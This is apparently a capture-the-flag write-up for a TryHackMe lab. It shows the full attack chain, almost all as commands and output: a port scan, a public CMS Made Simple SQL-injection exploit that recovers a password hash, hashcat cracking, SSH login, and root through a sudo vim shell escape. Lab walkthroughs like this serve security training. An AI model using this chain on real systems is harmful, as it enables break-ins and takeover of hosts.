https://tryhackme.com/room/easyctf


ip = `10.10.241.47`

# Open ports

21/tcp   open  ftp     vsftpd 3.0.3\
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

# Findings

`This site is powered by CMS Made Simple version 2.2.8` -> https://www.exploit-db.com/exploits/46635

python3 exploitSimpleCTF.py -u http://10.10.241.47/simple -w /usr/share/wordlists/rockyou.txt

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```


`hashcat -m 20 '0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2' Downloads/rockyou.tx` gives: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret

ssh mitch@10.10.241.47 -p 2222

```
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
$ ls
user.txt
$ cat user
cat: user: No such file or directory
$ cat user.txt
G00d j0b, keep up!
$ ls /home
mitch  sunbath
$ sudo vim -c ':!/bin/sh'

# whoami
root
# ls
user.txt
# cat user
cat: user: No such file or directory
# cat user.txt
G00d j0b, keep up!
# cd /root
# ls
root.txt
# cat root.txt
W3ll d0n3. You made it!
```